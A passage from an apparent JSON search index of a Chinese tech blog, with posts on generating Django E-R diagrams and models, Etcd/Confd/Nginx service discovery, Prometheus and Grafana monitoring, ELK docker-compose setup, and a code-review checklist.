CELLBORDER=\u0026#34;0\u0026#34; CELLSPACING=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD COLSPAN=\u0026#34;2\u0026#34; CELLPADDING=\u0026#34;4\u0026#34; ALIGN=\u0026#34;CENTER\u0026#34; BGCOLOR=\u0026#34;olivedrab4\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34; COLOR=\u0026#34;white\u0026#34;\u0026gt; ViewSet\u0026lt;BR/\u0026gt;\u0026amp;lt;\u0026lt;FONT FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;CommonElement\u0026lt;/FONT\u0026gt;\u0026amp;gt; \u0026lt;/FONT\u0026gt;\u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34;\u0026gt;id\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34;\u0026gt;AutoField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;create_time\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;DateTimeField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;doc\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;TextField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;name\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;CharField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;update_time\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;DateTimeField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;/TABLE\u0026gt; \u0026gt;] django_view_permission_models_ViewPermission [label=\u0026lt; \u0026lt;TABLE BGCOLOR=\u0026#34;palegoldenrod\u0026#34; BORDER=\u0026#34;0\u0026#34; CELLBORDER=\u0026#34;0\u0026#34; CELLSPACING=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD COLSPAN=\u0026#34;2\u0026#34; CELLPADDING=\u0026#34;4\u0026#34; ALIGN=\u0026#34;CENTER\u0026#34; BGCOLOR=\u0026#34;olivedrab4\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34; COLOR=\u0026#34;white\u0026#34;\u0026gt; ViewPermission\u0026lt;BR/\u0026gt;\u0026amp;lt;\u0026lt;FONT FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;CommonElement\u0026lt;/FONT\u0026gt;\u0026amp;gt; \u0026lt;/FONT\u0026gt;\u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34;\u0026gt;id\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34;\u0026gt;AutoField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;create_time\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;DateTimeField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;doc\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;TextField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;update_time\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;DateTimeField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;/TABLE\u0026gt; \u0026gt;] // Relations django_view_permission_models_View -\u0026gt; django_view_permission_models_CommonElement [label=\u0026#34;abstract\\ninheritance\u0026#34;] [arrowhead=empty, arrowtail=none, dir=both]; django_view_permission_models_ViewSet -\u0026gt; django_view_permission_models_View [label=\u0026#34;views (viewset)\u0026#34;] [arrowhead=dot arrowtail=dot, dir=both]; django_view_permission_models_ViewSet -\u0026gt; django_view_permission_models_CommonElement [label=\u0026#34;abstract\\ninheritance\u0026#34;] [arrowhead=empty, arrowtail=none, dir=both]; account_models_BkUser [label=\u0026lt; \u0026lt;TABLE BGCOLOR=\u0026#34;palegoldenrod\u0026#34; BORDER=\u0026#34;0\u0026#34; CELLBORDER=\u0026#34;0\u0026#34; CELLSPACING=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD COLSPAN=\u0026#34;2\u0026#34; CELLPADDING=\u0026#34;4\u0026#34; ALIGN=\u0026#34;CENTER\u0026#34; BGCOLOR=\u0026#34;olivedrab4\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34; COLOR=\u0026#34;white\u0026#34;\u0026gt;BkUser\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;/TABLE\u0026gt; \u0026gt;] django_view_permission_models_ViewPermission -\u0026gt; account_models_BkUser [label=\u0026#34;users (viewpermission)\u0026#34;] [arrowhead=dot arrowtail=dot, dir=both]; django_view_permission_models_ViewPermission -\u0026gt; django_view_permission_models_View [label=\u0026#34;views (viewpermission)\u0026#34;] [arrowhead=dot arrowtail=dot, dir=both]; django_view_permission_models_ViewPermission -\u0026gt; django_view_permission_models_ViewSet [label=\u0026#34;views_set (viewpermission)\u0026#34;] [arrowhead=dot arrowtail=dot, dir=both]; django_view_permission_models_ViewPermission -\u0026gt; django_view_permission_models_CommonElement [label=\u0026#34;abstract\\ninheritance\u0026#34;] [arrowhead=empty, arrowtail=none, dir=both]; } 生成图片 由于生成的是 dot 格式的图片描述文件，需要使用工具进行转换成常用的 PNG 格式图片。可以下载 graphviz ，并将 /bin/dot.exe 加入系统 PATH 中。\n1 dot -Tpng django_view_permission.dot \u0026gt; django_view_permission.png 还可以使用在线 Dot 预览工具 GraphvizOnline 查看，下载 PNG 图片。\n2. 生成数据库的 models.py Django 内置了 inspectdb 命令，可以利用数据库对应的表关系和字段，生成 Django Models。\n1 python manage.py inspectdb export_models.py 导出的文件内容如下：\nexport_models.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 # This is an auto-generated Django model module. # You\u0026#39;ll have to do the following manually to clean this up: # * Rearrange models\u0026#39; order # * Make sure each model has one field with primary_key=True # * Remove `managed = False` lines if you wish to allow Django to create, modify, and delete the table # Feel free to rename the models, but don\u0026#39;t rename db_table values or field names. # # Also note: You\u0026#39;ll have to insert the output of \u0026#39;django-admin sqlcustom [app_label]\u0026#39; # into your database. from __future__ import unicode_literals from django.db import models class DjangoViewPermissionView(models.Model): doc = models.TextField(blank=True, null=True) create_time = models.DateTimeField() update_time = models.DateTimeField() module = models.CharField(max_length=255, blank=True, null=True) func = models.CharField(max_length=255, blank=True, null=True) name = models.CharField(max_length=255, blank=True, null=True) class Meta: managed = False db_table = \u0026#39;django_view_permission_view\u0026#39; unique_together = ((\u0026#39;func\u0026#39;, \u0026#39;module\u0026#39;, \u0026#39;name\u0026#39;),) class DjangoViewPermissionViewPermission(models.Model): doc = models.TextField(blank=True, null=True) create_time = models.DateTimeField() update_time = models.DateTimeField() class Meta: managed = False db_table = \u0026#39;django_view_permission_view_permission\u0026#39; class DjangoViewPermissionViewPermissionUsers(models.Model): viewpermission = models.ForeignKey(DjangoViewPermissionViewPermission) bkuser = models.ForeignKey(AuthUser) class Meta: managed = False db_table = \u0026#39;django_view_permission_view_permission_users\u0026#39; unique_together = ((\u0026#39;viewpermission_id\u0026#39;, \u0026#39;bkuser_id\u0026#39;),) class DjangoViewPermissionViewPermissionViews(models.Model): viewpermission = models.ForeignKey(DjangoViewPermissionViewPermission) view = models.ForeignKey(DjangoViewPermissionView) class Meta: managed = False db_table = \u0026#39;django_view_permission_view_permission_views\u0026#39; unique_together = ((\u0026#39;viewpermission_id\u0026#39;, \u0026#39;view_id\u0026#39;),) class DjangoViewPermissionViewPermissionViewsSet(models.Model): viewpermission = models.ForeignKey(DjangoViewPermissionViewPermission) viewset = models.ForeignKey(\u0026#39;DjangoViewPermissionViewSet\u0026#39;) class Meta: managed = False db_table = \u0026#39;django_view_permission_view_permission_views_set\u0026#39; unique_together = ((\u0026#39;viewpermission_id\u0026#39;, \u0026#39;viewset_id\u0026#39;),) class DjangoViewPermissionViewSet(models.Model): doc = models.TextField(blank=True, null=True) create_time = models.DateTimeField() update_time = models.DateTimeField() name = models.CharField(unique=True, max_length=255) class Meta: managed = False db_table = \u0026#39;django_view_permission_view_set\u0026#39; class DjangoViewPermissionViewSetViews(models.Model): viewset = models.ForeignKey(DjangoViewPermissionViewSet) view = models.ForeignKey(DjangoViewPermissionView) class Meta: managed = False db_table = \u0026#39;django_view_permission_view_set_views\u0026#39; unique_together = ((\u0026#39;viewset_id\u0026#39;, \u0026#39;view_id\u0026#39;),) 需要注意的是，使用 migrate 命令创建数据库表时，managed = False 的 Models 会被忽略。\n3. 参考 https://segmentfault.com/a/1190000002978794 ","description":"","id":471,"section":"post","tags":["博文","Django","数据库","设计","Model"],"title":"Django Model 与 E-R 图","uri":"https://www.chenshaowen.com/blog/django-model-and-er-diagram.html"},{"content":" 本篇主要阐述了为什么需要服务发现功能，对几种服务发现工具进行了比较。同时，在 CentOS 上，对 Etcd、Confd 、Nginx 实现服务发现功能进行了实践。\n1. 服务注册与发现 1.1 为什么需要注册和发现服务 随着微服务的兴起，大量接口服务化。当新的微服务加入或微服务的信息发生变更时，服务方如何通知周边系统、使用方如何知道这些变更呢？\n这时就需要服务的注册配置和发现功能。\n服务注册配置——存储的信息至少包括正在运行的服务的主机和端口信息 服务发现——允许其他用户可以发现在服务注册配置阶段存储的信息。 1.2 几种服务发现工具的比较 Feature Consul Zookeeper Etcd Euerka 服务健康检查 服务状态，内存，硬盘等 (弱)长连接，keepalive 连接心跳 可配支持 多数据中心 支持 — — — kv存储服务 支持 支持 支持 — 一致性 raft paxos raft — cap ca cp cp ap 使用接口(多语言能力) 支持http和dns 客户端 http/grpc http（sidecar） watch支持 全量/支持long polling 支持 支持 long polling 支持 long polling/大部分增量 自身监控 metrics — metrics metrics 安全 acl /https acl https支持（弱） — spring cloud集成 已支持 已支持 已支持 已支持 注： - C，强一致性 （Consistency） - A，可用性 （Availability） - P，网络分区故障的容错性 （Partition Tolerance） Consul 是使用 Go 语言开发的分布式协调系统，对业务发现的管理提供很好的支持，它的 HTTP API 也能很好的和不同的语言绑定，并支持跨数据中心的应用。缺点是相对较新，适合喜欢尝试新事物的用户。\nZooKeeper 功能全，社区活跃，用户群体很大，对所有典型的用例都有很好的封装，支持不同语言的绑定。缺点是，整个应用比较重，依赖于 Java，不支持跨数据中心。\nEtcd 是一个更轻量级的分布式协调的应用，更适合一些轻量级的应用来使用，同时 Etcd 也提供 HTTP API 操作接口。值得注意的是，Kubernetes 采用了 Etcd 作为配置中心。\nEureka 是 Netflix 开源的一个 RESTful 服务，主要用于服务的注册发现。Eureka 由两个组件组成：Eureka 服务器和 Eureka 客户端。Eureka 服务器用作服务注册服务器。Eureka 客户端是一个 Java 客户端，用来简化与服务器的交互、作为轮询负载均衡器，并提供服务的故障切换支持。\n2. Etcd 2.1 简介 Etcd 是一个分布式、使用 Raft 算法维护一致性的 key-value 存储系统，与其类似产品有 Zookeeper、Consul 等，Etcd 相对 Zookeeper，更加轻量、易运维。同时，Etcd 支持 TLS 通信，具备高性能的写入能力。\n2.2 Raft 算法 很多的分布式系统都会采用 Paxos 协议，但是 Paxos 协议难以理解，并且在实际实现中差别比较大。所以 Etcd 选择了 Raft 作为它的一致性协议。Raft 是 Diego Ongaro 和 John Ousterhout 在 In Search of an Understandable Consensus Algorithm 中提出的。它在牺牲很少可用性，达到相似功能的情况下，对 Paxos 做了很大的优化，并且比 Paxos 简单易懂很多。\n它主要集中在解决两个问题：\n领导者选举(Leader Election)\nRaft 先通过领导选举选出一个 Leader，后续的一致性维护都由 Leader 来完成，这就简化了一致性的问题。Raft 会保证一个时间下只会有一个 Leader，并且在超过一半节点投票的情况下才会被选为 Leader。当 Leader 挂掉的时候，新的 Leader 将会被选出来。\n日志复制 (Log Replication)\n为了维护状态，系统会记录下来所有的操作命令日志。Leader 在收到客户端操作命令后，会追加到日志的尾部。然后 Leader 会向集群里所有其它节点发送 AppendEntries RPC 请求，每个节点都通过两阶段提交来复制命令，这保证了大部分的节点都能完成。\n3. Etcd + Confd + Nginx 在进行应用部署时，服务运行起来后，通过接口向 Etcd 注册相关 key-value 信息，Confd 检测到 Etcd 的 key-value 变化后，立即触发程序通过模板形成新的 Nginx 配置文件。\nNginx 先做离线语法测试，如果没问题就覆盖原配置，进而 reload，测试不通过就不覆盖原配置，整个过程安全可控。\n3.1 Nginx 安装配置 安装以 CentOS 为例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 安装 nginx yum install -y nginx # 查看 nginx 安装位置 whereis nginx nginx: /usr/sbin/nginx /usr/lib64/nginx /etc/nginx /usr/share/nginx /usr/share/man/man3/nginx.3pm.gz /usr/share/man/man8/nginx.8.gz # 查看 nginx 配置文件位置 nginx -t nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful # 查看配置 cat /etc/nginx/nginx.conf ... include /etc/nginx/conf.d/*.conf; ... include /etc/nginx/conf.d/*.conf; 这句配置会将 conf.d 目录下 .conf 后缀的文件配置载入 Nginx。\n3.2 Confd 安装配置 直接从 github 下载 Confd 的 Linux 编译版本，然后将可执行文件移动到 /usr/sbin/ 目录即可。\n1 2 3 4 5 6 # 下载 Confd 包 wget https://github.com/kelseyhightower/confd/releases/download/v0.15.0/confd-0.15.0-linux-amd64 # 复制可执行文件 mv confd-0.15.0-linux-amd64 /usr/sbin/confd # 增加可执行权限 chmod +x /usr/sbin/confd 3.3 Etcd 安装配置 安装以 CentOS 为例 1 yum -y install etcd 配置文件目录，/etc/etcd/etcd.conf 1 2 3 4 5 # 默认配置，可以不修改 ETCD_NAME=default ETCD_DATA_DIR=\u0026#34;/var/lib/etcd/default.etcd\u0026#34; ETCD_LISTEN_CLIENT_URLS=\u0026#34;http://0.0.0.0:2379\u0026#34; ETCD_ADVERTISE_CLIENT_URLS=\u0026#34;http://0.0.0.0:2379\u0026#34; 启动服务 1 service etcd start 3.4 Confd 安装配置 创建配置目录 1 mkdir -p /etc/confd/{conf.d,templates} 在 conf.d 下创建 .toml 配置文件\n/etc/confd/conf.d/app1.toml\n1 2 3 4 5 6 7 8 [template] prefix = \u0026#34;/app1\u0026#34; src = \u0026#34;subdomain.conf.tmpl\u0026#34; dest = \u0026#34;/tmp/app1-subdomain-confd-auto.conf\u0026#34; keys = [ \u0026#34;/subdomain\u0026#34;, \u0026#34;/upstream\u0026#34;, ] 1 2 3 4 5 6 7 8 9 10 [template] prefix = \u0026#34;/app1\u0026#34; src = \u0026#34;subdomain-nginx.conf.tmpl\u0026#34; dest = \u0026#34;/etc/nginx/conf.d/app1-subdomain-confd-nginx-auto.conf\u0026#34; keys = [ \u0026#34;/subdomain\u0026#34;, \u0026#34;/upstream\u0026#34;, ] check_cmd = \u0026#34;/usr/sbin/nginx -t\u0026#34; reload_cmd = \u0026#34;/usr/sbin/nginx -s reload\u0026#34; 在 templates 下创建 .tmpl 模板文件\n/etc/confd/templates/subdomain.conf.tmpl\n1 2 3 [subdomain] subdomain = {{getv \u0026#34;/subdomain\u0026#34;}} upstream = {{getv \u0026#34;/upstream\u0026#34;}} Nginx 模板配置\n/etc/confd/templates/subdomain-nginx.conf.tmpl\nupstream {{getv \u0026#34;/subdomain\u0026#34;}} { {{range getvs \u0026#34;/upstream/*\u0026#34;}} server {{.}}; {{end}} } server { server_name {{getv \u0026#34;/subdomain\u0026#34;}}.example.com; location / { proxy_pass http://{{getv \u0026#34;/subdomain\u0026#34;}}; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } 监听 Etcd 的 key-value 值的变化\n1 2 3 4 # 只处理一次 confd -onetime -backend etcd -node http://127.0.0.1:2379 # 按时间轮询 confd -interval=60 -backend etcd -node http://127.0.0.1:2379 \u0026amp; 3.5 注册服务 可以通过 etcdctl 命令，也可以通过 Etcd 提供的 HTTP API，在 Etcd 插入 subdomain 和 upstream 数据。下面以 etcdctl 为例：\n1 2 etcdctl set /app1/subdomain app1 etcdctl set /app1/upstream/instance1 \u0026#34;127.0.0.1:5601\u0026#34; 由于在本地 5601 端口，启动了 ELK 服务，通过访问 http://app1.example.com 打开 Kibana 。\n如果需要 Nginx 进行负载均衡，可以在 upstream 上配置多个键值。同时，需要在 /etc/confd/conf.d 目录下新建两个文件 app2-nginx.toml 和 app2.toml，内容上只需要将 app1-nginx.toml 和 app1.toml 中的 app1 修改为 app2 即可。\n1 2 3 etcdctl set /app2/subdomain app2 etcdctl set /app2/upstream/instance1 \u0026#34;127.0.0.2:80\u0026#34; etcdctl set /app2/upstream/instance2 \u0026#34;127.0.0.1:80\u0026#34; 4. 参考 https://luyiisme.github.io/2017/04/22/spring-cloud-service-discovery-products/ https://github.com/kelseyhightower/confd/blob/master/docs/quick-start-guide.md ","description":"","id":472,"section":"post","tags":["博文","工具","微服务","Etcd","Confd","Nginx","服务发现"],"title":"Etcd、Confd 、Nginx 服务发现","uri":"https://www.chenshaowen.com/blog/service-discovery-etcd-confd-nginx.html"},{"content":" 互联网的服务常依赖于成千上万的主机，而这些主机又部署在世界各地，再加上错综复杂的用户环境，要保证服务的稳定可靠，就需要对服务进行监控。监控的目的可以从这几个方面考虑：从系统维度，了解CPU、内存、硬盘使用情况；从网络监控维度，了解网络上行、下行速率；从服务监控维度，了解应用程序的健康性、可用性。当然，有了监控数据，还可以配置告警，通知维护人员、辅助排查故障问题。\n1. 监控开源工具 1.1 Nagios 优点 监控所有协议（HTTP, FTP, SSH, POP3, SMTP, SNMP, MySQL…） 完全独立，没有依赖 支持震荡检测 插件化 缺点 Web 页面不友好 不支持数据的图表显示 1.2 Zabbix 优点 监控所有协议（HTTP, FTP, SSH, POP3, SMTP, SNMP, MySQL…） Web 界面友好 可以监控 Log 文件 支持 Client agent ( Pull、Push model) 缺点 配置比较复杂 需要关系型数据库支持 ( mysql、PostgreSQL..） 1.3 Prometheus 优点 用 Go 编写，性能好 支持多语言客户端 (sdk) 支持 Pul l和 Push 模式 支持多种数据可视化模式 ( Grafana ) 缺点 缺少插件支持 2. Prometheus + Grafana 搭建 Prometheus 是源于 Google Borgmon 的一个开源监控系统，用 Golang 开发。被很多人称为下一代监控系统。\nPrometheus 基本原理是通过 HTTP 协议周期性抓取被监控组件的状态。只要组件提供 HTTP 接口就可以接入监控系统，不需要任何 SDK 或者其他的集成过程。这样做非常适合虚拟化环境比如 VM 、 Docker、Mesos 、Kubernetes 。\n输出被监控组件信息的 HTTP 接口被叫做 exporter 。\nGrafana 是一个开源的图表可视化系统，简单说图表配置比较方便、生成的图表比较漂亮。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # docker-compose.yml version: \u0026#39;2\u0026#39; services: prometheus: image: prom/prometheus:latest volumes: - ./prometheus.yml:/etc/prometheus/prometheus.yml command: - \u0026#39;-config.file=/etc/prometheus/prometheus.yml\u0026#39; ports: - \u0026#39;9090:9090\u0026#39; node-exporter: image: prom/node-exporter:latest ports: - \u0026#39;9100:9100\u0026#39; grafana: image: grafana/grafana:latest environment: - GF_SECURITY_ADMIN_PASSWORD=password depends_on: - prometheus ports: - \u0026#34;3000:3000\u0026#34; Prometheus 使用 YAML 进行配置。global 配置一些全局信息，scrape_configs 配置具体想要抓取的目标。\n1 2 3 4 5 6 7 8 9 10 11 12 # prometheus.yml global: scrape_interval: 5s external_labels: monitor: \u0026#39;my-monitor\u0026#39; scrape_configs: - job_name: \u0026#39;prometheus\u0026#39; target_groups: - targets: [\u0026#39;localhost:9090\u0026#39;] - job_name: \u0026#39;node-exporter\u0026#39; target_groups: - targets: [\u0026#39;node-exporter:9100\u0026#39;] 以 CentOS 为例，安装 Docker 和 Docker compose\n1 2 3 4 5 yum install docker yum install epel-release yum install python-pip pip install --upgrade pip pip install docker-compose 启动 Docker\n1 2 service docker start docker-compose up 3. 参考 http://blog.yichicloud.com/%E5%BE%AE%E6%9C%8D%E5%8A%A1/monitoring-with-prometheus https://finestructure.co/blog/2016/5/16/monitoring-with-prometheus-grafana-docker-part-1 http://blog.yichicloud.com/%E5%BE%AE%E6%9C%8D%E5%8A%A1/monitoring-with-prometheus.html ","description":"","id":473,"section":"post","tags":["博文","Docker","监控"],"title":"Prometheus","uri":"https://www.chenshaowen.com/blog/monitor-about-prometheus.html"},{"content":" 本文主要简单介绍了 ELK 的技术栈，并给出了 Docker compose 的编排配置。阅读本文，可在本地通过 Docker 将 ELK 跑起来。后续会将 ELK 在服务器上进行部署，相关的配置再补充。\n1. ELK 技术栈介绍 ELK 其实并不是一款软件，而是一整套解决方案，是三个软件产品的首字母缩写，Elasticsearch，Logstash 和 Kibana。这三款软件都是开源软件，通常是配合使用，简称为 ELK 协议栈。\nELK 已经成为目前最流行的集中式日志解决方案。\n基本流程是 Logstash 负责从各种数据源里采集数据，然后发送到 Elasticsearch，Elasticsearch 对这些数据创建索引，然后由 Kibana 对其进行各种分析并以图表的形式展示。\nLogstash 在服务器上占用过多系统资源，通常会引入 Beats 作为日志的收集器。Beats 所占系统的 CPU 和内存几乎可以忽略不计。\n2. Elasticsearch Elasticsearch 是一个实时的分布式搜索和分析引擎，它可以用于全文搜索，结构化搜索以及分析。它是一个建立在全文搜索引擎 Apache Lucene 基础上的搜索引擎，使用 Java 语言编写。\n主要特点\n实时分析 分布式实时文件存储，并将每一个字段都编入索引 文档导向，所有的对象全部是文档 高可用性，易扩展，支持集群（Cluster）、分片和复制（Shards 和 Replicas） 接口友好，支持 JSON 3. Logstash Logstash 是一个具有实时渠道能力的数据收集引擎，使用 JRuby 语言编写。其作者是世界著名的运维工程师乔丹西塞 (JordanSissel)。\n主要特点\n几乎可以访问任何数据 可以和多种外部应用结合 支持弹性扩展 它由三个主要部分组成：\nShipper－发送日志数据 Broker－收集数据，缺省内置 Redis Indexer－数据写入 4. Kibana Kibana 是一个开源的分析与可视化平台，设计出来用于和 Elasticsearch 一起使用的。Kibana 可以使用搜索、查看、交互存放在 Elasticsearch 索引里的数据，能够很轻松地进行高级数据分析与数据可视化。\nKibana 能够更好地处理海量数据，并据此创建柱形图、折线图、散点图、直方图、饼图和地图。\n5. Filebeat Fielbeat 是基于 logstash-forwarder 的源码改造而来，换句话说：Filebeat 就是最新版的 logstash-forwarder。它负责从当前服务器获取日志然后转发给 Logstash 或 Elasticserach 进行处理。\nFilebeat 包含两个部分 prospectors 和 harversters。 harversters 负责从文件中收集日志；prospectors 负责管理 harversters。\n6. 实践 docker-compose.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 version: \u0026#39;2\u0026#39; services: elasticsearch: image: elasticsearch:5.6 container_name: elasticsearch restart: always network_mode: \u0026#34;bridge\u0026#34; ports: - \u0026#34;9200:9200\u0026#34; - \u0026#34;9300:9300\u0026#34; volumes: - ./data:/usr/share/elasticsearch/data kibana: image: kibana:5.6 container_name: kibana restart: always network_mode: \u0026#34;bridge\u0026#34; ports: - \u0026#34;5601:5601\u0026#34; depends_on: - elasticsearch external_links: - elasticsearch:elasticsearch logstash: image: logstash:5.6 container_name: logstash restart: always network_mode: \u0026#34;bridge\u0026#34; ports: - \u0026#34;5044:5044\u0026#34; - \u0026#34;8080:8080\u0026#34; volumes: - ./conf:/config-dir - ./patterns:/opt/logstash/patterns depends_on: - elasticsearch external_links: - elasticsearch:elasticsearch command: logstash -f /config-dir filebeat: image: olinicola/filebeat:1.0.1 container_name: filebeat restart: always network_mode: \u0026#34;bridge\u0026#34; extra_hosts: - \u0026#34;logstash:127.0.0.1\u0026#34; volumes: - ./filebeat.yml:/etc/filebeat/filebeat.yml - ./data/logs:/data/logs - /var/log:/var/host/log - ./registry:/etc/registry 以 CentOS 为例，首先需要安装 Docker 和 Docker compose。\n1 2 3 4 5 yum install docker yum install epel-release yum install python-pip pip install --upgrade pip pip install docker-compose 启动 Docker。\n1 2 service docker start docker-compose up 本地通 http://127.0.0.1:5601 即可访问 Kibana 页面了。\n7. 参考 https://www.ibm.com/developerworks/cn/opensource/os-cn-elk/index.html ","description":"","id":474,"section":"post","tags":["博文","工具","日志","搜索"],"title":"ELK 日志搜索实践","uri":"https://www.chenshaowen.com/blog/elk-log-search-practice.html"},{"content":"1. 如何更好做 CodeReview 要求 事项 代码提交者的要求 小粒度\n原子性 有注释 工具检查 对代码 Review 者的要求 一看规范\n二看逻辑\u0026amp;性能\n三看设计 对团队的要求 温故而知新 2. 制定CodeReview CheckList 要求 事项 命名 变量名字\n类命名\n方法命名\n参数命名 代码长度 类长度不超过1000行\n方法长度不超过100行 条件嵌套 避免多个 If，循环语句嵌套\n避免判断条件过长 参数、返回值检查 参数个数建议不大于 3\n参数合法性判断（如判断 null ，容器长度等）\n返回值合法性判断（如判断 null，容器长度等） 复用封装好的代码 